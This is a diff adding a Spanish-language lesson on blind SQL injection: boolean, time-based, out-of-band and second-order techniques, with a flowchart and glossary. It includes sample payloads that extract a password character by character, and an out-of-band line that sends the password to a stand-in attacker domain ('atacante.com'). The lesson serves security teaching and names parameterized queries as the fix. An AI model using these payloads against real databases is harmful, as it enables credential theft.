@@ -33,6 +33,69 @@ Al finalizar, el alumno podrá:
 | 6 | Automatización con scripts | La extracción manual es lenta |
 | 7 | Diferencias por motor | SLEEP vs. WAITFOR vs. pg_sleep |
 
+## 🧠 Explicación en profundidad
+
+### Cuando la aplicación no te enseña nada
+
+En muchas aplicaciones la inyección funciona pero **no se ven los resultados**: no hay errores,
+la consulta no se refleja en la página, solo cambia el comportamiento de forma sutil. Es la
+**inyección ciega** (*blind SQLi*), y su idea central es que, aunque no puedas *leer* la base de
+datos directamente, sí puedes **hacerle preguntas de sí/no** y deducir los datos bit a bit por
+las respuestas. Es más lenta que la UNION de la clase anterior, pero igual de potente: al final
+se extrae exactamente la misma información, solo que interrogando en lugar de leyendo.
+
+```mermaid
+flowchart TD
+  I["Inyeccion confirmada<br/>pero sin datos visibles"] --> Q{"Que senal cambia?"}
+  Q -->|"la pagina se comporta distinto"| B["Blind BOOLEANA<br/>AND SUBSTRING(pass,1,1)='a'"]
+  Q -->|"nada visible, pero puedo medir tiempo"| T["Blind TEMPORAL<br/>IF(cond, SLEEP(5), 0)"]
+  Q -->|"puedo hacer que el servidor llame fuera"| O["Out-of-band<br/>DNS/HTTP a un dominio propio"]
+  B --> EXT["Extraer dato caracter a caracter<br/>preguntas de si/no"]
+  T --> EXT
+  O --> EXT
+  classDef n fill:#eaf3ee,stroke:#2e8b57,color:#12321f
+  classDef d fill:#0b3d2e,stroke:#0b3d2e,color:#ffffff
+  class I,B,T,O,EXT n
+  class Q d
+```
+
+### Booleana y temporal: dos formas de leer un sí o un no
+
+La **inyección ciega booleana** aprovecha cualquier diferencia observable entre una condición
+verdadera y una falsa. Se inyecta una condición sobre el dato buscado —por ejemplo,
+`AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'`— y se observa si la página
+responde como en el caso "verdadero" o en el "falso". Repitiendo con cada letra del alfabeto y
+cada posición, se reconstruye la contraseña carácter a carácter. Las funciones clave son las de
+**subcadena** (`SUBSTRING`, `SUBSTR`) para aislar un carácter y `ASCII`/`ORD` para compararlo
+por su valor numérico, lo que permite una **búsqueda binaria** (`> 'm'`) mucho más rápida que
+probar letra por letra.
+
+La **inyección ciega temporal** se usa cuando **no hay ninguna diferencia visible** en la
+respuesta. El truco es hacer que la propia consulta **tarde**: `IF(condición, SLEEP(5), 0)`
+—o `WAITFOR DELAY` en SQL Server, `pg_sleep` en PostgreSQL—. Si la página tarda cinco segundos
+de más, la condición era verdadera; si responde al instante, falsa. Es el canal más
+lento y el más ruidoso, pero funciona cuando todo lo demás falla, porque el **tiempo** es una
+señal que siempre está disponible.
+
+### Out-of-band y segundo orden: los canales que no pasan por la respuesta
+
+Cuando ni el contenido ni el tiempo sirven, queda el canal **out-of-band (OOB)**: forzar a la
+base de datos a **iniciar una conexión hacia fuera** —una resolución DNS o una petición HTTP a
+un dominio que el atacante controla—, incluyendo el dato robado en el propio nombre consultado
+(`(SELECT password...)||'.atacante.com'`). El atacante lee el dato en los logs de su servidor
+DNS. Es rapidísimo comparado con el blind bit a bit y atraviesa entornos muy restringidos,
+aunque depende de que el motor permita esas funciones de red (más común en Oracle y SQL Server).
+
+La **inyección de segundo orden** (*second-order*) es la más traicionera y la que los escáneres
+suelen pasar por alto. El payload se **almacena** en un punto (por ejemplo, al registrarse con un
+nombre de usuario malicioso) y **no se ejecuta ahí**, sino **después**, cuando otra parte de la
+aplicación usa ese dato guardado en una consulta sin sanear (al mostrar el perfil, al generar un
+informe). Como la inyección y su ejecución ocurren en momentos y sitios distintos, solo se
+encuentra entendiendo el **flujo de datos** de la aplicación, no probando cada campo de forma
+aislada. Toda esta clase, más lenta y precisa que la anterior, es la que las herramientas
+automatizan —motivo de la clase 093—, y toda ella se cierra con la misma remediación:
+consultas parametrizadas, que hacen imposible tanto la inyección directa como la ciega.
+
 ## 📖 Definiciones y características
 
 - **Blind SQLi**: la respuesta no incluye datos, solo cambia de forma observable. Característica: se infiere info por diferencias sutiles.
@@ -41,6 +104,25 @@ Al finalizar, el alumno podrá:
 - **Out-of-band (OOB)**: los datos salen por DNS/HTTP a un servidor del atacante. Característica: requiere que el motor pueda iniciar conexiones.
 - **Second-order**: el input se almacena y se ejecuta en otra operación posterior. Característica: difícil de detectar en el punto de entrada.
 - **Oráculo booleano**: cualquier señal binaria fiable (código, longitud, contenido). Característica: base de la extracción bit a bit.
+
+## 📔 Glosario
+
+| Término | Definición concisa |
+|---------|--------------------|
+| Inyección ciega (blind) | La inyección funciona pero no se ven los datos |
+| Booleana | Deducir datos por la diferencia entre condición verdadera y falsa |
+| SUBSTRING / SUBSTR | Aísla un carácter del dato buscado |
+| ASCII / ORD | Compara un carácter por su valor numérico |
+| Búsqueda binaria | Acota el carácter con comparaciones `>`/`<` |
+| Inyección temporal | Deducir por el tiempo de respuesta (`SLEEP`, `WAITFOR`) |
+| SLEEP / pg_sleep / WAITFOR | Funciones de retardo por motor |
+| Out-of-band (OOB) | Forzar a la BD a conectar fuera y exfiltrar por DNS/HTTP |
+| Canal OOB | Los logs del servidor del atacante reciben el dato |
+| Segundo orden | El payload se guarda y se ejecuta después, en otro sitio |
+| Flujo de datos | Rastro del dato guardado hasta donde se usa sin sanear |
+| Extracción carácter a carácter | Reconstruir el dato preguntando bit a bit |
+| Dependencia del motor | Las funciones OOB y de tiempo varían por base de datos |
+| Remediación | Consultas parametrizadas, igual que en la inyección directa |
 
 ## 🧰 Herramientas y preparación
 
